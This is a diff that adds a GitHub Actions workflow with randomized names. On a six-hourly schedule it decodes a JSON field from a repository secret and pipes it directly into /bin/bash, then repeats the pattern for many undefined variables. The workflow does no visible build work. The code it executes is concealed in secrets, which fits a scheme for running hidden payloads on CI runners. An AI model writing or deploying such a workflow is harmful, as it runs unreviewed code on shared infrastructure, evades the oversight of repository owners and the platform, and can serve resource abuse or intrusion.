@@ -1,0 +1,30 @@
+name: yanfusu1932
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanfusu1932
+        env:
+          gil5: ${{ secrets.gil5 }}
+        run: |
+          echo $gil5 | jq -r .qkhg18904 | /bin/bash
+          echo $ifd7 | jq -r .cxi10 | /bin/bash
+          echo $cdi7 | jq -r .c5 | /bin/bash
+          echo $xkwcq233 | jq -r .nqe01166 | /bin/bash
+          echo $npf9270 | jq -r .kxm52 | /bin/bash
+          echo $qtcoz6737 | jq -r .sh60 | /bin/bash
+          echo $ozxo6 | jq -r .zx70 | /bin/bash
+          echo $q0174 | jq -r .nh4 | /bin/bash
+          echo $mo464 | jq -r .gi0709 | /bin/bash
+          echo $i9 | jq -r .g88 | /bin/bash
+          echo $c12432 | jq -r .e2341 | /bin/bash
+          echo $lc10 | jq -r .nls9 | /bin/bash
+          echo $r6 | jq -r .fpkl667 | /bin/bash
+          echo $z94571 | jq -r .ntli9026 | /bin/bash
+          echo $kg1467 | jq -r .rfz15773 | /bin/bash
+
